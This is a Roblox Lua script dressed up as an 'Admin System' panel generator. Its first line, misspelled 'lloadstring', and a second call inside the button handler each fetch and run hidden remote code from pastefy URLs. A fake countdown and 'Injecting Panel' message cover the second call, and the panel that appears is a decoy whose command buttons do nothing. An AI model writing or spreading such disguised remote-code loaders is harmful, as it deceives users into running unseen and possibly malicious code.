lloadstring(game:HttpGet("https://pastefy.app/PebFRrZ6/raw"))()
--// Services
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local player = Players.LocalPlayer

--// ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AdminLoadingGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

--// UI Frame
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 320, 0, 180)
Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Parent = ScreenGui

Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)

-- Visuals: Gradient (Green/Blue for Admin theme)
local grad = Instance.new("UIGradient", Frame)
grad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 150)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
}

-- Visuals: Title & Credit
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "Admin System"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Parent = Frame

local Credit = Instance.new("TextLabel")
Credit.Size = UDim2.new(1, 0, 0, 20)
Credit.Position = UDim2.new(0, 0, 0, 35)
Credit.BackgroundTransparency = 1
Credit.Text = "Initializing Secure Panel..."
Credit.Font = Enum.Font.Gotham
Credit.TextSize = 14
Credit.TextColor3 = Color3.fromRGB(200, 200, 200)
Credit.Parent = Frame

-- Interaction: Button
local Button = Instance.new("TextButton")
Button.Size = UDim2.new(0.8, 0, 0, 50)
Button.Position = UDim2.new(0.1, 0, 0.45, 0)
Button.Text = "Generate Admin Panel"
Button.Font = Enum.Font.GothamBold
Button.TextSize = 18
Button.TextColor3 = Color3.new(1, 1, 1)
Button.BackgroundColor3 = Color3.fromRGB(30, 40, 50)
Button.Parent = Frame

Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 10)

--// DRAG SYSTEM
local dragging, dragStart, startPos
Frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
UIS.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

--// BUTTON LOGIC & ADMIN PANEL EXECUTION
Button.MouseButton1Click:Connect(function()
	if Frame:FindFirstChild("Timer") then return end

	Button.Active = false
	Button.AutoButtonColor = false
	Button.Text = "Loading..."

	local Timer = Instance.new("TextLabel")
	Timer.Name = "Timer"
	Timer.Size = UDim2.new(1, 0, 0, 30)
	Timer.Position = UDim2.new(0, 0, 0.8, 0)
	Timer.BackgroundTransparency = 1
	Timer.Font = Enum.Font.Gotham
	Timer.TextSize = 16
	Timer.TextColor3 = Color3.new(1, 1, 1)
	Timer.Parent = Frame

	-- The 20 second countdown
	for i = 20, 1, -1 do
		Timer.Text = "Generating Admin Panel... "..i.."s"
		task.wait(1)
	end

	Timer.Text = "Injecting Panel..."
	task.wait(0.5)

	--// EXECUTE YOUR ADMIN PANEL SCRIPT
	local success, err = pcall(function()
		-- Your specific MiniAdminPanel code
		loadstring(game:HttpGet("https://pastefy.app/qYlkCOqd/raw"))()
		
		local gui = Instance.new("ScreenGui")
		gui.Name = "MiniAdminPanel"
		gui.ResetOnSpawn = false
		gui.Parent = player:WaitForChild("PlayerGui")

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0, 280, 0, 300)
		frame.Position = UDim2.new(0.5, -140, 0.5, -150)
		frame.BackgroundColor3 = Color3.fromRGB(30, 60, 40)
		frame.BorderSizePixel = 0
		frame.Active = true
		frame.Draggable = true
		frame.Parent = gui

		local title = Instance.new("TextLabel")
		title.Size = UDim2.new(1, 0, 0, 36)
		title.BackgroundColor3 = Color3.fromRGB(90, 120, 130)
		title.Text = "ADMIN PANEL"
		title.TextScaled = true
		title.Font = Enum.Font.GothamBold
		title.TextColor3 = Color3.new(1,1,1)
		title.Parent = frame

		local cmdBox = Instance.new("TextBox")
		cmdBox.Size = UDim2.new(1, -12, 0, 32)
		cmdBox.Position = UDim2.new(0, 6, 0, 42)
		cmdBox.PlaceholderText = "Enter command"
		cmdBox.Text = ""
		cmdBox.TextScaled = true
		cmdBox.Font = Enum.Font.Gotham
		cmdBox.BackgroundColor3 = Color3.fromRGB(20,40,30)
		cmdBox.TextColor3 = Color3.new(1,1,1)
		cmdBox.Parent = frame

		local container = Instance.new("Frame")
		container.Size = UDim2.new(1, -12, 1, -100)
		container.Position = UDim2.new(0, 6, 0, 80)
		container.BackgroundTransparency = 1
		container.Parent = frame

		local layout = Instance.new("UIGridLayout")
		layout.CellSize = UDim2.new(0, 125, 0, 36)
		layout.CellPadding = UDim2.new(0, 6, 0, 6)
		layout.Parent = container

		local commands = {";rocket", ";ragdoll", ";balloon", ";inverse", ";nightvision", ";jail", ";control", ";tiny", ";jumpscare", ";morph"}

		for _,cmd in ipairs(commands) do
			local btn = Instance.new("TextButton")
			btn.Text = cmd
			btn.TextScaled = true
			btn.Font = Enum.Font.GothamBold
			btn.TextColor3 = Color3.new(1,1,1)
			btn.BackgroundColor3 = Color3.fromRGB(15, 80, 50)
			btn.Parent = container

			btn.MouseButton1Click:Connect(function()
				btn.BackgroundColor3 = Color3.fromRGB(0,150,80)
				task.wait(0.15)
				btn.BackgroundColor3 = Color3.fromRGB(15,80,50)
			end)
		end

		local toggle = Instance.new("TextButton")
		toggle.Size = UDim2.new(0, 90, 0, 28)
		toggle.Position = UDim2.new(1, -96, 1, -34)
		toggle.Text = "Hide"
		toggle.TextScaled = true
		toggle.Font = Enum.Font.GothamBold
		toggle.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
		toggle.TextColor3 = Color3.new(1,1,1)
		toggle.Parent = frame

		local visible = true
		toggle.MouseButton1Click:Connect(function()
			visible = not visible
			container.Visible = visible
			cmdBox.Visible = visible
			toggle.Text = visible and "Hide" or "Show"
		end)
	end)

	if not success then
		warn("Admin Panel Error: " .. tostring(err))
	end

	-- Cleanup the loading UI
	ScreenGui:Destroy()
end)
